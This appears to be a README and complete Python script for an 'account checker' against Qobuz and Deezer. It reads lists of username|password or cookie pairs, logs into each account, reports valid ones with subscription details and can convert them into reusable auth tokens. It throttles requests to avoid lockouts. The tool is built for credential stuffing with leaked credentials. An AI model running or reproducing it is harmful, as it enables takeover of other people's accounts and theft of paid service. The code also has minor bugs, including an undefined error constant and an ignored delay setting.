# Streaming Account Checker
***

-> Check validity of streaming accounts and obtain their credentials. <-

Currently supported:
* Qobuz
* Deezer
***

## Changelog
- 0.1.1
	- Fixed bug when checking Qobuz subscription. Download can be possible without active subscription.
- 0.1.0
	- Initial release

***

``` python
from os.path import abspath
from os import SEEK_END

from sys import exit
from sys import argv

from dataclasses import dataclass
from abc import ABC, abstractmethod

from time import sleep

from re import compile as regex
from datetime import datetime
from argparse import ArgumentParser

from pathlib import Path
from requests import Session
from getpass import getpass

DEFAULT_SEPARATOR = '|'
DEFAULT_DELAY = 1

EMAIL_SIGN = '@'
SPACE_REGEX = regex(r'\s')

LINE = '─' * 100

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/110.0'


@dataclass
class Plan:
    name: str
    expires: str
    active: bool
    download: bool
    lossless: bool
    explicit: bool


@dataclass
class Account:
    id: int
    token: str
    country: str
    plan: Plan


class ErrorText:
    CONNECTION = 'Could not connect! Service down, API changed, wrong credentials or code-related issue.'
    APP_ID = 'Could not obtain App-Id! Service down or API changed.'
    AUTH = 'Could not login! Credentials wrong or inexistent account!'
    PARSE = 'Could not parse JSON!'


class ConnectionError(Exception):
    pass


class AuthError(Exception):
    pass


class ParseError(Exception):
    pass


class ServiceError(Exception):
    pass


class PlatformProvider(ABC):
    def __init__(self):
        self.session = Session()

    @abstractmethod
    def login(self, username, secret):
        pass


class DeezerPlatformProvider(PlatformProvider):
    NAME = 'Deezer'

    BASE_URL = 'http://www.deezer.com'
    API_PATH = '/ajax/gw-light.php'
    SESSION_DATA = {
        'api_token': 'null',
        'api_version': '1.0',
        'input': '3',
        'method': 'deezer.getUserData'
    }

    def __init__(self):
        super().__init__()

        self.session.headers.update({'User-Agent': USER_AGENT})

    def login(self, username, secret):
        try:
            res = self.session.post(
                self.BASE_URL + self.API_PATH,
                cookies={'arl': secret},
                data=self.SESSION_DATA
            )
            res.raise_for_status()
        except Exception as error:
            raise ConnectionError(ErrorText.CONNECTION_FAIL)

        self.session.cookies.clear()

        try:
            res = res.json()
        except Exception as error:
            raise ParseError(ErrorText.PARSE)

        if 'error' in res and res['error']:
            raise ServiceError(res["error"])

        res = res['results']

        if res['USER']['USER_ID'] == 0:
            raise AuthError(ErrorText.AUTH)

        return Account(username, secret, res['COUNTRY'], Plan(
            res['OFFER_NAME'],
            'Unknown',
            True,
            True,
            res['USER']['OPTIONS']['web_sound_quality']['lossless'],
            res['USER']['EXPLICIT_CONTENT_LEVEL']
        ))


class QobuzPlatformProvider(PlatformProvider):
    NAME = 'Qobuz'

    BASE_URL = 'https://play.qobuz.com'
    LOGIN_PATH = '/login'
    API_BASE_URL = 'https://www.qobuz.com/api.json/0.2'
    API_LOGIN_PATH = '/user/login'

    BUNDLE_URL_REGEX = regex(
        r'<script src="(/resources/\d+\.\d+\.\d+-[a-z]\d{3}/bundle\.js)"></script>'
    )
    APP_ID_REGEX = regex(r'production:{api:{appId:"(?P<app_id>\d{9})"')

    def __init__(self):
        super().__init__()

        appId = self.__getAppId()

        if not appId:
            raise ServiceError(ErrorText.APP_ID)

        self.session.headers.update({
                'User-Agent': USER_AGENT,
                'X-App-Id': self.__getAppId()
            }
        )

    def __getAppId(self):
        try:
            res = self.session.get(self.BASE_URL + self.LOGIN_PATH)
            res.raise_for_status()
        except Exception as error:
            return

        self.session.cookies.clear()

        match = self.BUNDLE_URL_REGEX.search(res.text)

        if not match:
            return

        try:
            res = self.session.get(self.BASE_URL + match.group(1))
            res.raise_for_status()
        except Exception as error:
            return

        self.session.cookies.clear()

        match = self.APP_ID_REGEX.search(res.text)

        if not match:
            return

        return match.group('app_id')

    def login(self, username, secret):
        params = {'email': username, 'password': secret} if EMAIL_SIGN in username else {
            'user_id': username, 'user_auth_token': secret}

        try:
            res = self.session.get(self.API_BASE_URL +
                                   self.API_LOGIN_PATH, params=params)
            res.raise_for_status()
        except Exception as error:
            raise ConnectionError(ErrorText.CONNECTION)

        self.session.cookies.clear()

        try:
            res = res.json()
        except Exception as error:
            raise ParseError(ErrorText.PARSE)
        
        if 'status' in res:
            raise AuthError(ErrorText.AUTH)

        return Account(
            res['user']['id'],
            res['user_auth_token'],
            res['user']['country_code'],
            Plan(
                res['user']['credential']['parameters'] and res['user']['credential']['parameters']['label'],
                res['user']['subscription']['end_date'] if res['user']['subscription'] else 'Unknown',
                res['user']['subscription'] and (datetime.now() < datetime.strptime(res['user']['subscription']['end_date'], '%Y-%m-%d')),
                res['user']['store_features']['streaming'],
                res['user']['store_features']['streaming'] and res['user']['credential']['parameters'] and res['user']['credential']['parameters']['hires_streaming'],
                res['user']['store_features']['streaming']
            )
        )


def main():
    providers = {
        'qobuz': QobuzPlatformProvider,
        'deezer': DeezerPlatformProvider
    }

    parser = ArgumentParser(
        prog='Account Checker', description='Description coming soon...')
    parser.add_argument('platform', type=str, choices=providers)
    parser.add_argument('file', nargs='?', type=abspath)
    parser.add_argument('-x', '--separator', type=str,
                        default=DEFAULT_SEPARATOR, help=f'character to separate username/secret (default: "{ DEFAULT_SEPARATOR }")')
    parser.add_argument('-d', '--delay', type=float, default=DEFAULT_DELAY, help=f'delay in seconds between requests, to prevent lockout (default: { DEFAULT_DELAY })')
    parser.add_argument('-c', '--convert', action='store_true',
                        help='display id/token instead of username/password')
    user = parser.add_argument_group(
        'user', 'Directly specifiy credentials to check')
    user.add_argument('-u', '--username', nargs='?', type=str,
                      const='', help='omit value for hidden prompt')
    user.add_argument('-s', '--secret', nargs='?', type=str,
                      const='', help='omit value for hidden prompt')

    if not argv[2:]:
        parser.print_help()
        parser.exit()

    args = parser.parse_args()

    accounts = []

    if args.username is not None:
        accounts.append(
            [
                args.username if args.username else getpass('Username: '),
                args.secret if args.secret else getpass('Secret: ')
            ]
        )
    elif args.secret is not None:
        accounts.append(
            [
                '',
                args.secret if args.secret else getpass('Secret: ')
            ]
        )

    if accounts:
        print('Added account from parameters to queue.')

    if args.file is not None:
        print('Looking for file "%s"...' % args.file)

        if Path(args.file).is_file():
            print('File located. Reading contents...')

            fileAccounts = []

            with open(args.file, 'r', encoding='UTF-8') as file:
                file.seek(0, SEEK_END)

                if file.tell():
                    file.seek(0)
                    for num, line in enumerate(file, 1):
                        line = line.strip()
                        if args.separator in line:
                            (username, secret) = map(
                                str.strip, line.split(args.separator, 1))

                            fileAccounts.append([username, secret])
                        elif SPACE_REGEX.search(line):
                            print(
                                f'Could not split values with provided delimiter "{ args.separator }" at line { num }.'
                            )
                        else:
                            fileAccounts.append(['', line])

            if not fileAccounts:
                print('Found 0 entries. Skipping...')
            else:
                print(f'Found and added { len(fileAccounts) } {"entry" if len(fileAccounts) == 1 else "entries"} to queue.')

                accounts += fileAccounts
        else:
            print(f'File "{ args.file }" does not exist! Skipping...')

    if not accounts:
        exit('No accounts provided. Exiting...')

    print(f'Initializing {providers[args.platform].NAME}...')

    try:
        provider = providers[args.platform]()
    except Exception as error:
        exit(error)

    accCount = len(accounts)

    for index, (username, secret) in enumerate(accounts, 1):
        try:
            account = provider.login(username, secret)

            if index == 1:
                print(LINE)

            if account.id:
                print(f'Username: { account.id if args.convert else username }')
            
            print(f'Secret: { account.token if args.convert else secret }')
            print(f'Country: { account.country }', end=' | ')

            if account.plan:
                print(f'Plan: { account.plan.name }', end=' | ')
                print(f'Expiration: { account.plan.expires }', end=' | ')
                print(f'Active: { "🟢" if account.plan.active else "🔴" }', end=' | ')
                print(f'Download: { "🟢" if account.plan.download else "🔴" }', end=' | ')
                print(f'Lossless: { "🟢" if account.plan.lossless else "🔴" }', end=' | ')
                print(f'Explicit: { "🟢" if account.plan.explicit else "🔴" }')
                
            print(LINE)
        except Exception as error:
            if index == 1:
                print(LINE)
            
            if username:
                print(f'Username: { username }')
            
            print(f'Secret: { secret }')
            print(f'Error: { error }')

            print(LINE)

        if index != accCount:
            sleep(DEFAULT_DELAY)
    
    print('Done.')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Aborted!')

        exit(130)
```